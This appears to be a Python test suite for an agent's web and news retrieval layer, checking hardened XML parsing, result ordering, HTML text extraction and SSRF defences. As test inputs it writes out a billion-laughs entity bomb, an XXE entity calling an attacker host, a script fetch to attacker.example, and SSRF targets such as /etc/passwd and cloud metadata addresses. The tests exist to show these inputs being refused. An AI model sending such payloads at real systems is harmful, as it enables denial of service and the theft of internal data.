"""Behavior and security tests for controller-owned public retrieval.

These target consumer-visible boundaries of the retrieval layer: hardened
XML parsing (regardless of encoding), the real general web endpoint with
well-formed request URLs, newest-first news ordering before the result cap,
and case-preserving HTML text extraction. No network access happens in this
suite: HTTP transport itself is exercised by the witnessed smokes.
"""

import asyncio
import socket

import pytest

from oi_agent.external.records import EvidenceItem
from oi_agent.external.retrieval import (
    _WEB_ENDPOINT,
    RetrievalError,
    _parse_rss,
    _PinnedResolver,
    _validate_url,
    fetch_public_document,
    html_to_text,
    is_public_address,
    parse_hardened_xml,
)

RETRIEVED_AT = "2026-10-10T00:00:00+00:00"


def _feed(items: str) -> bytes:
    """Wrap item XML in a minimal RSS 2.0 envelope."""
    return (
        "<?xml version=\"1.0\"?>"
        "<rss version=\"2.0\"><channel>"
        f"{items}"
        "</channel></rss>"
    ).encode("utf-8")


def _item(title: str, link: str, pub: str | None = None, description: str = "") -> str:
    pub_tag = f"<pubDate>{pub}</pubDate>" if pub else ""
    return (
        f"<item><title>{title}</title>"
        f"<link>{link}</link>{pub_tag}"
        f"<description>{description}</description></item>"
    )


# --- correction 2: hardened XML regardless of encoding -----------------------


def test_utf16_entity_expansion_is_refused_not_expanded():
    """A UTF-16 billion-laughs document is refused; no expanded text survives.

    The parent proved the previous ASCII byte-regex prefilter was bypassed by
    UTF-16 XML and the entity text came back expanded. defusedxml must reject
    the DTD/entities whatever the declared encoding.
    """
    attack = (
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
        "<!DOCTYPE rss [<!ENTITY a \"AAAAAAA\">"
        "<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">]>"
        "<rss><channel><item><title>&b;</title>"
        "<link>https://example.com/a</link></item></channel></rss>"
    )
    payload = attack.encode("utf-16")
    with pytest.raises(RetrievalError) as excinfo:
        parse_hardened_xml(payload)
    assert excinfo.value.category == "feed_declares_dtd"


def test_external_entity_reference_is_refused_without_network():
    """An XXE document pointing at an external URL is refused."""
    attack = (
        "<?xml version=\"1.0\"?>"
        "<!DOCTYPE rss [<!ENTITY xxe SYSTEM \"https://attacker.invalid/collect\">]>"
        "<rss><channel><item><title>&xxe;</title>"
        "<link>https://example.com/a</link></item></channel></rss>"
    ).encode("utf-8")
    with pytest.raises(RetrievalError) as excinfo:
        parse_hardened_xml(attack)
    assert excinfo.value.category == "feed_declares_dtd"


def test_utf16_wellformed_feed_parses():
    """Encoding declarations alone are not suspicious; a clean feed parses."""
    feed = (
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
        "<rss version=\"2.0\"><channel><item>"
        "<title>Clean UTF-16</title><link>https://example.com/a</link>"
        "</item></channel></rss>"
    ).encode("utf-16")
    root = parse_hardened_xml(feed)
    assert root.find("channel/item/title").text == "Clean UTF-16"


def test_malformed_xml_reports_bounded_category():
    """Garbage that is not XML at all fails with the bounded category."""
    with pytest.raises(RetrievalError) as excinfo:
        parse_hardened_xml(b"< this is not xml")
    assert excinfo.value.category == "feed_unparseable"


# --- correction 3: real general web endpoint ---------------------------------


def test_web_endpoint_is_general_search_not_news_wrapper():
    """The web vertical must use the Bing RSS endpoint, not Google News."""
    assert _WEB_ENDPOINT == "https://www.bing.com/search"


def test_web_search_request_carries_format_param_once(monkeypatch):
    """Bing's format=rss rides in the same query string as the topic."""
    from oi_agent.external import retrieval

    captured: dict = {}

    async def fake_fetch(url: str):
        captured["url"] = url
        return retrieval.FetchedDocument(
            url=url,
            final_url=url,
            content_type="application/xml",
            text="",
            truncated=False,
            raw=_feed(_item("Result", "https://www.python.org/downloads/")),
        )

    monkeypatch.setattr(retrieval, "fetch_public_document", fake_fetch)
    import asyncio

    items = asyncio.run(retrieval.search_web("python release"))
    assert items, "web results expected"
    url = captured["url"]
    assert url.startswith("https://www.bing.com/search?")
    assert url.count("?") == 1, "endpoint params must merge, not add a second ?"
    assert "format=rss" in url
    assert "q=python+release" in url


def test_web_results_carry_publisher_provenance_and_bounded_description(monkeypatch):
    """A web result cites the RESULT host, never Bing, and keeps its snippet."""
    from oi_agent.external import retrieval

    snippet = "&lt;b&gt;Python 3.14&lt;/b&gt; is the newest release of the Python language."
    raw = _feed(
        _item(
            "Python 3.14 released",
            "https://www.python.org/downloads/",
            "Tue, 07 Oct 2025 10:00:00 GMT",
            snippet,
        )
    )

    async def fake_fetch(url: str):
        return retrieval.FetchedDocument(
            url=url, final_url=url, content_type="application/xml",
            text="", truncated=False, raw=raw,
        )

    monkeypatch.setattr(retrieval, "fetch_public_document", fake_fetch)
    import asyncio

    items = asyncio.run(retrieval.search_web("python release", limit=5))
    assert len(items) == 1
    assert items[0].source_name == "www.python.org"
    assert "Python 3.14" in items[0].text
    assert "python.org" not in items[0].url or "bing" not in items[0].url
    assert items[0].published_at is not None


# --- correction 4: sort by publication time BEFORE the cap -------------------


def test_news_items_are_newest_first_before_cap():
    """Feed order must not hide fresh news behind stale items."""
    raw = _feed(
        _item("Old", "https://a.example.com/1", "Mon, 01 Jan 2024 00:00:00 GMT")
        + _item("Fresh", "https://b.example.com/2", "Wed, 08 Oct 2025 00:00:00 GMT")
        + _item("Middle", "https://c.example.com/3", "Sat, 01 Feb 2025 00:00:00 GMT")
    )
    items = _parse_rss(raw, kind="news", limit=2, retrieved_at=RETRIEVED_AT)
    assert [item.title for item in items] == ["Fresh", "Middle"]
    assert all(item.published_at for item in items)


def test_undated_items_sort_last_and_state_the_limitation():
    """Unknown publication times are explicit and never disguise themselves."""
    raw = _feed(
        _item("Undated", "https://a.example.com/1")
        + _item("Dated", "https://b.example.com/2", "Mon, 01 Jan 2024 00:00:00 GMT")
    )
    items = _parse_rss(raw, kind="news", limit=2, retrieved_at=RETRIEVED_AT)
    assert [item.title for item in items] == ["Dated", "Undated"]
    assert any("publication time" in note for note in items[1].limitations)


def test_result_cap_applies_after_sorting_not_during_parse():
    """The cap keeps the NEWEST items, not the first ones in feed order."""
    items_xml = "".join(
        _item(f"Item{i}", f"https://host{i}.example.com/{i}",
              f"Mon, 0{(i % 9) + 1} Jan 202{i} 00:00:00 GMT")
        for i in range(1, 6)
    )
    items = _parse_rss(_feed(items_xml), kind="news", limit=2, retrieved_at=RETRIEVED_AT)
    assert len(items) == 2
    times = [item.published_at for item in items]
    assert times == sorted(times, reverse=True)


# --- correction 4: case-preserving linear HTML extraction --------------------


def test_html_extraction_preserves_publisher_case():
    """Evidence text keeps the published case; no blanket lowercasing."""
    markup = (
        "<html><head><title>ignored</title></head><body>"
        "<h1>Python Releases</h1>"
        "<p>FastAPI 0.141 adds StreamingResponse fixes.</p>"
        "</body></html>"
    )
    text = html_to_text(markup)
    assert "Python Releases" in text
    assert "FastAPI 0.141 adds" in text
    assert "ignored" not in text


def test_html_extraction_drops_script_and_style_content():
    """Script/style bodies never reach the model as page text."""
    markup = (
        "<html><head><style>.a{color:red}</style>"
        "<script>var token = 'secret-value';</script></head>"
        "<body><p>Visible content</p>"
        "<script>fetch('//attacker.example')</script></body></html>"
    )
    text = html_to_text(markup)
    assert "Visible content" in text
    assert "secret-value" not in text
    assert "attacker.example" not in text
    assert "color:red" not in text


def test_aggregator_wrapper_html_is_never_attributed_to_publisher(monkeypatch):
    """A fetch that never leaves the news wrapper stays headline-only."""
    from oi_agent.external.prepare import _attach_article_excerpt
    from oi_agent.external.records import PreparedInputs

    headline = EvidenceItem(
        kind="news",
        title="Headline",
        url="https://news.google.com/rss/articles/wrapper",
        source_name="The Publisher",
        retrieved_at=RETRIEVED_AT,
        published_at="2026-10-01T00:00:00+00:00",
        text="",
        limitations=("headline only; article body not fetched",),
    )

    class FakeDocument:
        final_url = "https://news.google.com/rss/articles/wrapper"
        text = "Google consent wrapper HTML that is NOT the article."

    async def fake_fetch(url: str):
        return FakeDocument()

    from oi_agent.external import prepare

    monkeypatch.setattr(prepare, "fetch_public_document", fake_fetch)
    inputs = PreparedInputs()
    inputs.evidence.extend([headline])

    import asyncio
    from types import SimpleNamespace

    asyncio.run(_attach_article_excerpt(SimpleNamespace(inputs=inputs), [headline]))
    assert inputs.evidence[0].text == ""
    assert inputs.evidence[0].url == headline.url
    assert "headline only" in inputs.evidence[0].limitations[0]


# --- review fix: SSRF boundaries ----------------------------------------------
#
# The retrieval security model refuses loopback, private, link-local/metadata,
# CGNAT, multicast/reserved/unspecified, and IPv4-mapped addresses; URL
# userinfo, non-HTTP(S) schemes, unusual ports, and non-public hosts; DNS
# answers that contain ANY non-public address (rebinding shape); and redirect
# hops that leave the validated public space. These tests pin each boundary.


@pytest.mark.parametrize(
    "address",
    [
        "127.0.0.1",          # loopback
        "::1",                # IPv6 loopback
        "10.1.2.3",           # 10/8
        "172.16.0.1",         # 172.16/12 start
        "172.31.255.255",     # 172.16/12 end
        "192.168.1.1",        # 192.168/16
        "169.254.169.254",    # link-local / cloud metadata
        "100.64.0.1",         # carrier-grade NAT 100.64/10
        "224.0.0.1",          # multicast
        "ff02::1",            # IPv6 multicast
        "0.0.0.0",            # unspecified
        "::ffff:127.0.0.1",   # IPv4-mapped loopback
        "192.0.2.1",          # TEST-NET-1 (reserved, non-global)
    ],
)
def test_is_public_address_refuses_nonpublic_addresses(address):
    """Every non-global, special-purpose address is refused."""
    assert not is_public_address(address), address


@pytest.mark.parametrize(
    "address",
    ["93.184.216.34", "8.8.8.8", "2606:4700::1111"],
)
def test_is_public_address_allows_global_addresses(address):
    """Globally routable addresses of both families are allowed."""
    assert is_public_address(address), address


@pytest.mark.parametrize(
    ("url", "category"),
    [
        ("file:///etc/passwd", "scheme_not_allowed"),
        ("ftp://example.com/file", "scheme_not_allowed"),
        ("http://example.com:8080/", "port_not_allowed"),
        ("http://user:pass@example.com/", "userinfo_not_allowed"),
        ("http://localhost/", "host_not_public"),
        ("http://metadata.google.internal/", "host_not_public"),
        ("http://127.0.0.1/admin", "address_not_public"),
        ("http://10.0.0.5/", "address_not_public"),
        ("http://[fe80::1]/", "address_not_public"),
        ("http://", "invalid_url"),
        ("http://exa mple.com/", "invalid_url"),
        ("http://example.com:99999/", "invalid_url"),
    ],
)
def test_validate_url_refuses_with_honest_category(url, category):
    """Every refused shape raises an honest bounded category, never a crash."""
    with pytest.raises(RetrievalError) as excinfo:
        _validate_url(url)
    assert excinfo.value.category == category


@pytest.mark.parametrize(
    ("url", "host", "port"),
    [
        ("http://example.com/path", "example.com", 80),
        ("https://example.com", "example.com", 443),
        ("http://93.184.216.34/", "93.184.216.34", 80),
        ("http://[2606:4700::1111]/", "2606:4700::1111", 80),
    ],
)
def test_validate_url_accepts_public_urls(url, host, port):
    """Public HTTP(S) URLs, including IPv6 literals, validate cleanly."""
    assert _validate_url(url) == (host, port, url.split(":", 1)[0])


class _FakeInnerResolver:
    """Stand-in for the threaded resolver with a scripted answer set."""

    def __init__(self, infos):
        self._infos = list(infos)

    async def resolve(self, host, port=0, family=socket.AF_INET):
        return list(self._infos)

    async def close(self):
        pass


def _resolve_with(infos, host):
    """Run one pinned resolve inside a loop (ThreadedResolver needs one)."""

    async def run():
        resolver = _PinnedResolver()
        resolver._inner = _FakeInnerResolver(infos)
        return await resolver.resolve(host)

    return asyncio.run(run())


def _answer(*hosts):
    return [
        {"hostname": "host.example.com", "host": host,
         "port": 443, "family": socket.AF_INET, "proto": socket.IPPROTO_TCP,
         "flags": socket.AI_NUMERICSERV}
        for host in hosts
    ]


def test_pinned_resolver_rejects_all_private_answer():
    """A purely private answer set never becomes a connection target."""
    with pytest.raises(RetrievalError) as excinfo:
        _resolve_with(_answer("192.168.1.5"), "internal.example.com")
    assert excinfo.value.category == "dns_answer_not_public"


def test_pinned_resolver_rejects_mixed_public_private_answer():
    """A public+private answer set is a rebinding shape and is refused whole."""
    with pytest.raises(RetrievalError) as excinfo:
        _resolve_with(_answer("93.184.216.34", "10.0.0.9"), "rebinding.example.com")
    assert excinfo.value.category == "dns_answer_not_public"


def test_pinned_resolver_accepts_all_public_answer():
    """An all-public answer set passes through pinned, unchanged."""
    resolved = _resolve_with(_answer("93.184.216.34", "8.8.8.8"), "example.com")
    assert [info["host"] for info in resolved] == ["93.184.216.34", "8.8.8.8"]


class _FakeResponse:
    def __init__(self, status, headers):
        self.status = status
        self.headers = headers


class _FakeResponseContext:
    def __init__(self, response):
        self._response = response

    async def __aenter__(self):
        return self._response

    async def __aexit__(self, *exc_info):
        return False


class _ScriptedSession:
    """Minimal aiohttp session stand-in serving scripted responses."""

    def __init__(self, responses):
        self._responses = list(responses)

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc_info):
        return False

    def get(self, url, **kwargs):
        assert self._responses, "fetch must not issue more requests than scripted"
        return _FakeResponseContext(self._responses.pop(0))


def _redirect(status, location):
    return _FakeResponse(status, {"Location": location})


@pytest.mark.parametrize(
    ("location", "category"),
    [
        ("http://127.0.0.1/admin", "address_not_public"),
        ("http://10.0.0.5/secret", "address_not_public"),
        ("http://[fd00::1]/internal", "address_not_public"),
        ("ftp://example.com/file", "scheme_not_allowed"),
        ("file:///etc/passwd", "scheme_not_allowed"),
    ],
)
def test_redirect_into_prohibited_destination_is_refused(monkeypatch, location, category):
    """A redirect hop is re-validated: loopback, private, and non-HTTP die."""
    from oi_agent.external import retrieval

    session = _ScriptedSession([_redirect(302, location)])
    monkeypatch.setattr(retrieval, "_session", lambda: session)

    with pytest.raises(RetrievalError) as excinfo:
        asyncio.run(fetch_public_document("http://public.example.com/start"))
    assert excinfo.value.category == category
    assert not session._responses, "no second request may be issued after refusal"
